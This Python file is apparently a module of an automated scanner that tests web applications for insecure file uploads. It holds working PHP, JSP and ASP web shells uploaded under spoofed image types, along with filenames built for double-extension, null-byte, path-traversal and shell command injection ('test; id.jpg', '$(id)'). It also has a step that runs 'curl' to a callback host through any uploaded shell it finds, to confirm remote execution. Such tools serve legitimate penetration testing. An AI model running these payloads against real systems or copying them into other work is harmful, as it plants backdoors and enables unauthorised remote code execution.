#!/usr/bin/env python3
"""Insecure File Upload Tester

Tests for insecure file upload vulnerabilities:
- File type validation bypass (double extensions, MIME spoofing)
- Path traversal in filenames
- Executable file uploads (PHP, JSP, ASP, etc.)
- File size limits and DoS vectors
- Upload success and execution validation
"""

import os
import time
import requests
from typing import Dict, Any, Optional, List
from urllib.parse import urlparse
from io import BytesIO


def discover_upload_endpoints(discovery_data: Dict[str, Any]) -> List[Dict[str, Any]]:
    """Discover file upload endpoints from discovery data
    
    Args:
        discovery_data: Discovery data containing endpoints
        
    Returns:
        List of potential upload endpoints
    """
    upload_endpoints = []
    
    # Extract endpoints from discovery data
    endpoints = []
    if "api_endpoints" in discovery_data:
        endpoints = discovery_data["api_endpoints"]
    elif "endpoints" in discovery_data:
        endpoints = discovery_data["endpoints"]
    elif "web" in discovery_data and "api_endpoints" in discovery_data["web"]:
        endpoints = discovery_data["web"]["api_endpoints"]
    
    # Keywords that suggest file upload
    upload_keywords = [
        "upload", "file", "image", "avatar", "attachment",
        "document", "media", "photo", "picture", "video"
    ]
    
    for endpoint in endpoints:
        url = endpoint.get("url") or endpoint.get("path", "")
        method = endpoint.get("method", "GET").upper()
        
        # Check if endpoint suggests file upload
        url_lower = url.lower()
        if any(keyword in url_lower for keyword in upload_keywords):
            if method in ["POST", "PUT", "PATCH"]:
                upload_endpoints.append({
                    "url": url,
                    "method": method,
                    "path": endpoint.get("path", ""),
                })
    
    return upload_endpoints


def test_file_upload(
    target_url: str,
    upload_endpoint: Optional[str] = None,
    callback_url: Optional[str] = None
) -> Dict[str, Any]:
    """Test for insecure file upload vulnerabilities
    
    Args:
        target_url: Target URL
        upload_endpoint: Specific upload endpoint (if None, will try to discover)
        callback_url: Optional callback URL for execution validation
        
    Returns:
        Dict with test results
    """
    result = {
        "type": "file_upload",
        "test": "file_upload",
        "vulnerable": False,
        "url": target_url,  # Include URL for detection matching
        "bypass_methods": [],
        "uploaded_files": [],
        "rce_confirmed": False,
        "evidence": None
    }
    
    # If no endpoint provided, use target URL
    if not upload_endpoint:
        upload_endpoint = target_url
    
    # File upload bypass techniques
    bypass_payloads = [
        # Double extensions
        ("shell.php.jpg", "double_extension"),
        ("shell.php.png", "double_extension"),
        ("shell.php.gif", "double_extension"),
        ("shell.jsp.jpg", "double_extension"),
        ("shell.asp.jpg", "double_extension"),
        # Path traversal in filename
        ("../shell.php", "path_traversal"),
        ("..\\shell.php", "path_traversal_windows"),
        ("....//shell.php", "path_traversal_encoded"),
        # Null byte injection
        ("shell.php%00.jpg", "null_byte"),
        ("shell.php\x00.jpg", "null_byte_raw"),
        # Case variation
        ("shell.PHP", "case_variation"),
        ("shell.PhP", "case_variation"),
        # No extension
        ("shell", "no_extension"),
        # Command injection in filename (NEW)
        ("test; id.jpg", "command_injection_semicolon"),
        ("test| id.jpg", "command_injection_pipe"),
        ("test`id`.jpg", "command_injection_backtick"),
        ("test$(id).jpg", "command_injection_dollar"),
        ("test&& id.jpg", "command_injection_double_amp"),
        ("test; sleep 5.jpg", "command_injection_sleep"),
    ]
    
    # Executable file content
    php_shell = b"<?php system($_GET['cmd']); ?>"
    jsp_shell = b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
    asp_shell = b"<% eval request(\"cmd\") %>"
    
    # Test each bypass method
    for filename, bypass_type in bypass_payloads:
        # Determine file content based on extension
        if ".php" in filename.lower() or filename.lower().endswith("php"):
            file_content = php_shell
            content_type = "image/jpeg"  # MIME spoofing
        elif ".jsp" in filename.lower() or filename.lower().endswith("jsp"):
            file_content = jsp_shell
            content_type = "image/jpeg"
        elif ".asp" in filename.lower() or filename.lower().endswith("asp"):
            file_content = asp_shell
            content_type = "image/jpeg"
        else:
            file_content = php_shell
            content_type = "image/jpeg"
        
        try:
            # Prepare file upload
            files = {
                "file": (filename, BytesIO(file_content), content_type),
                "upload": (filename, BytesIO(file_content), content_type),
                "image": (filename, BytesIO(file_content), content_type),
            }
            
            # Try different parameter names
            for param_name in ["file", "upload", "image", "attachment", "document"]:
                files_dict = {param_name: (filename, BytesIO(file_content), content_type)}
                
                try:
                    resp = requests.post(
                        upload_endpoint,
                        files=files_dict,
                        timeout=10
                    )
                    
                    # Check for upload success indicators
                    success_indicators = [
                        "upload successful", "file uploaded", "uploaded",
                        "success", "200", "ok", filename
                    ]
                    
                    response_lower = resp.text.lower()
                    
                    # Check for command injection indicators (for command injection payloads)
                    cmd_indicators = ["uid=", "gid=", "groups=", "volume serial", "directory of"]
                    cmd_detected = False
                    if "command_injection" in bypass_type:
                        import re
                        text_content = re.sub(r'<[^>]+>', ' ', resp.text)
                        text_content_lower = text_content.lower()
                        for ind in cmd_indicators:
                            if ind in response_lower or ind in text_content_lower:
                                cmd_detected = True
                                result["vulnerable"] = True
                                result["bypass_methods"].append(bypass_type)
                                result["evidence"] = {
                                    "filename": filename,
                                    "bypass_type": bypass_type,
                                    "indicator": ind,
                                    "response_snippet": resp.text[:500],
                                    "note": "Command injection detected in file upload filename"
                                }
                                break
                    
                    # Check for upload success indicators (for other bypass types)
                    if not cmd_detected and any(ind in response_lower for ind in success_indicators):
                        # Upload appears successful
                        result["vulnerable"] = True
                        result["bypass_methods"].append(bypass_type)
                        
                        # Try to determine uploaded file location
                        uploaded_path = None
                        # Common upload paths
                        common_paths = [
                            f"/uploads/{filename}",
                            f"/files/{filename}",
                            f"/images/{filename}",
                            f"/media/{filename}",
                            f"/{filename}",
                        ]
                        
                        # Try to access uploaded file
                        parsed = urlparse(upload_endpoint)
                        base_url = f"{parsed.scheme}://{parsed.netloc}"
                        
                        for path in common_paths:
                            test_url = base_url + path
                            try:
                                test_resp = requests.get(test_url, timeout=5)
                                if test_resp.status_code == 200:
                                    uploaded_path = test_url
                                    result["uploaded_files"].append({
                                        "filename": filename,
                                        "path": uploaded_path,
                                        "bypass_method": bypass_type
                                    })
                                    
                                    # Test execution if callback URL provided
                                    if callback_url:
                                        exec_url = f"{test_url}?cmd=curl {callback_url}"
                                        try:
                                            exec_resp = requests.get(exec_url, timeout=5)
                                            result["rce_confirmed"] = True
                                            result["evidence"] = {
                                                "filename": filename,
                                                "uploaded_path": uploaded_path,
                                                "bypass_method": bypass_type,
                                                "execution_tested": True,
                                                "status_code": resp.status_code,
                                                "note": "File uploaded and execution attempted"
                                            }
                                        except Exception:
                                            pass
                                    break
                            except Exception:
                                continue
                        
                        if not uploaded_path:
                            result["evidence"] = {
                                "filename": filename,
                                "bypass_method": bypass_type,
                                "status_code": resp.status_code,
                                "response_snippet": resp.text[:500],
                                "note": "Upload appears successful but file location unknown"
                            }
                        
                        break  # Found working bypass, move to next
                        
                except Exception:
                    continue
                    
        except Exception:
            continue
        
        if result["vulnerable"] and result["rce_confirmed"]:
            break
    
    return result


def validate_file_upload(
    discovery_data: Dict[str, Any],
    callback_server_url: Optional[str] = None
) -> Dict[str, Any]:
    """Main validation function for file upload vulnerabilities
    
    Args:
        discovery_data: Discovery data containing target URLs and endpoints
        callback_server_url: Optional callback server URL for OOB detection
        
    Returns:
        Dict with validation results
    """
    results = {
        "vulnerable": False,
        "tests_run": 0,
        "findings": []
    }
    
    # Discover upload endpoints
    upload_endpoints = discover_upload_endpoints(discovery_data)
    
    # If no endpoints found, try target URL directly
    target = discovery_data.get("target")
    if not upload_endpoints and target:
        upload_endpoints = [{"url": target, "method": "POST"}]
    
    if not upload_endpoints:
        return results
    
    # Initialize callback correlator if callback server is configured
    correlator = None
    job_id = None
    callback_url = None
    
    if callback_server_url:
        try:
            from tools.callback_correlator import CallbackCorrelator
            correlator = CallbackCorrelator(callback_server_url)
            job_id = f"file_upload_{int(time.time())}"
            target = target or upload_endpoints[0]["url"]
            token = correlator.register_job(job_id, "file_upload", target, timeout=300)
            callback_url = correlator.get_callback_url(token)
            print(f"[FILE-UPLOAD] Callback enabled: {callback_url}")
        except Exception as e:
            print(f"[FILE-UPLOAD] Callback setup failed: {e}, continuing without callbacks")
            callback_server_url = None
    
    # Test each upload endpoint
    for endpoint in upload_endpoints:
        endpoint_url = endpoint.get("url")
        if not endpoint_url:
            continue
        
        test_result = test_file_upload(
            target or endpoint_url,
            upload_endpoint=endpoint_url,
            callback_url=callback_url
        )
        results["tests_run"] += 1
        if test_result["vulnerable"]:
            results["vulnerable"] = True
            results["findings"].append(test_result)
    
    # Poll for callback hits if callback enabled
    if callback_server_url and correlator:
        print(f"[FILE-UPLOAD] Polling for callback hits (job_id: {job_id})...")
        time.sleep(5)  # Wait for potential callback
        hits = correlator.poll_hits(job_id, timeout=60, interval=2)
        if hits:
            print(f"[FILE-UPLOAD] Received {len(hits)} callback hit(s)")
            for hit in hits:
                results["findings"].append({
                    "type": "file_upload_callback_confirmed",
                    "test": "file_upload_rce",
                    "vulnerable": True,
                    "confidence": "high",
                    "rce_confirmed": True,
                    "callback_evidence": {
                        "remote_addr": hit.get("remote_addr"),
                        "user_agent": hit.get("user_agent"),
                        "method": hit.get("method"),
                        "path": hit.get("path"),
                        "query_params": hit.get("query_params"),
                        "timestamp": hit.get("timestamp"),
                    },
                    "note": "File upload RCE confirmed via out-of-band callback"
                })
                results["vulnerable"] = True
    
    return results


if __name__ == "__main__":
    import argparse
    
    ap = argparse.ArgumentParser(description="File Upload Tester")
    ap.add_argument("--target", required=True, help="Target URL")
    ap.add_argument("--endpoint", help="Upload endpoint URL")
    ap.add_argument("--callback-server-url", help="Callback server URL")
    args = ap.parse_args()
    
    callback_url = None
    if args.callback_server_url:
        from tools.callback_correlator import CallbackCorrelator
        correlator = CallbackCorrelator(args.callback_server_url)
        job_id = f"file_upload_{int(time.time())}"
        token = correlator.register_job(job_id, "file_upload", args.target, timeout=300)
        callback_url = correlator.get_callback_url(token)
    
    discovery_data = {"target": args.target}
    if args.endpoint:
        discovery_data["api_endpoints"] = [{"url": args.endpoint, "method": "POST"}]
    
    result = validate_file_upload(discovery_data, args.callback_server_url)
    
    import json
    print(json.dumps(result, indent=2))

